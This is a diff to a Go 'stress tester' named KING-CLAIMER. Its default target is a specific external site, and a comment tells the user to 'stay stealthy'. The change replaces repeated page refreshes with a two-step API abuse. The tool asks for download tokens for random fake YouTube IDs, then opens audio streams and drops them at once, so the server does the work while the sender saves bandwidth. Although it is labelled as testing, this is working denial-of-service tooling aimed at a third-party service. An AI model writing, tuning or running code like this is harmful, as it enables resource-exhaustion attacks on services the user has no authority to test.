@@ -1,6 +1,8 @@
 package main
 
 import (
+	"encoding/json"
+	"fmt"
 	"io"
 	"log"
 	"math/rand"
@@ -18,14 +20,16 @@ import (
 // CONFIGURATION (STAY STEALTHY)
 // ==========================================
 var (
-	SERVER_URL      = getEnv("TARGET_URL", "https://shrutibots.site/")
-	TOTAL_CLIENTS   = 300          // Number of concurrent refresh clients
-	MAX_WORKERS     = 300
-	REFRESH_DELAY   = 80 * time.Millisecond // Lower = heavier stress (80ms ≈ 375 RPS total)
+	SERVER_URL    = getEnv("TARGET_URL", "https://shrutibots.site/")
+	TOTAL_CLIENTS = 3                         // Number of concurrent refresh clients
+	MAX_WORKERS   = 3
+	REFRESH_DELAY = 8000 * time.Millisecond // Lower = heavier stress
 )
 
 // Worker Semaphore to limit max workers
 var workerSemaphore = make(chan struct{}, MAX_WORKERS)
+
+const ytIDChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"
 
 func init() {
 	rand.Seed(time.Now().UnixNano())
@@ -39,6 +43,15 @@ func getEnv(key, defaultValue string) string {
 		return value
 	}
 	return defaultValue
+}
+
+// Generates a random 11-character string to simulate a YouTube ID
+func generateRandomYouTubeID() string {
+	b := make([]byte, 11)
+	for i := range b {
+		b[i] = ytIDChars[rand.Intn(len(ytIDChars))]
+	}
+	return string(b)
 }
 
 // ==========================================
@@ -66,26 +79,62 @@ func (c *StressClient) DoRefresh() {
 	c.lastActivity = time.Now()
 	c.lock.Unlock()
 
-	targetURL := SERVER_URL
-
-	req, err := http.NewRequest("GET", targetURL, nil)
+	vidID := generateRandomYouTubeID()
+	
+	// STEP 1: Request the download token
+	downloadURL := fmt.Sprintf("%sdownload?url=%s&type=audio", SERVER_URL, vidID)
+	req1, err := http.NewRequest("GET", downloadURL, nil)
 	if err != nil {
 		log.Printf("[Client %d] NewRequest failed: %v", c.clientID, err)
 		return
 	}
 
-	resp, err := c.httpClient.Do(req)
+	resp1, err := c.httpClient.Do(req1)
 	if err != nil {
-		log.Printf("[Client %d] Request error: %v", c.clientID, err)
+		log.Printf("[Client %d] Request 1 error: %v", c.clientID, err)
 		return
 	}
-	defer resp.Body.Close()
+	defer resp1.Body.Close()
 
-	// Consume body (simulates real browser, keeps connection alive for load balancer test)
-	io.Copy(io.Discard, resp.Body)
+	if resp1.StatusCode != 200 {
+		log.Printf("[Client %d] API returned non-200 status for ID %s: %d", c.clientID, vidID, resp1.StatusCode)
+		io.Copy(io.Discard, resp1.Body)
+		return
+	}
 
-	// Logging response headers like X-Cache can show if you hit or missed (Fastly specific)
-	log.Printf("[Client %d] Page Refresh -> Status: %d | %s", c.clientID, resp.StatusCode, targetURL)
+	// Parse JSON to get the token
+	var result map[string]interface{}
+	if err := json.NewDecoder(resp1.Body).Decode(&result); err != nil {
+		log.Printf("[Client %d] Failed to decode JSON: %v", c.clientID, err)
+		return
+	}
+
+	tokenData, ok := result["download_token"]
+	if !ok || tokenData == nil {
+		log.Printf("[Client %d] No download_token in response for ID %s", c.clientID, vidID)
+		return
+	}
+	token := tokenData.(string)
+
+	// STEP 2: Request the stream endpoint using the token
+	streamURL := fmt.Sprintf("%sstream/%s?type=audio&token=%s", SERVER_URL, vidID, token)
+	req2, err := http.NewRequest("GET", streamURL, nil)
+	if err != nil {
+		log.Printf("[Client %d] Stream NewRequest failed: %v", c.clientID, err)
+		return
+	}
+
+	resp2, err := c.httpClient.Do(req2)
+	if err != nil {
+		log.Printf("[Client %d] Stream Request error: %v", c.clientID, err)
+		return
+	}
+	
+	// DROP THE REQUEST: Immediately close the body without using io.Copy
+	// This abandons the download payload while still forcing the server to process the API request
+	resp2.Body.Close()
+
+	log.Printf("[Client %d] Success! Stream Requested & Dropped -> Status: %d | ID: %s", c.clientID, resp2.StatusCode, vidID)
 }
 
 func (c *StressClient) Run() {
@@ -109,7 +158,7 @@ func main() {
 	log.Println(" KING-CLAIMER HTTP REFRESH STRESS TESTER ")
 	log.Printf(" Target: %s", SERVER_URL)
 	log.Printf(" Clients: %d | Workers: %d | Delay: %v", TOTAL_CLIENTS, MAX_WORKERS, REFRESH_DELAY)
-	log.Println(" Mode: Repeated page refresh")
+	log.Println(" Mode: API Token Request + Stream Drop (Bandwidth Saver)")
 	log.Println(" Purpose: Test regional routing + load balancing")
 	log.Println("========================================")
 
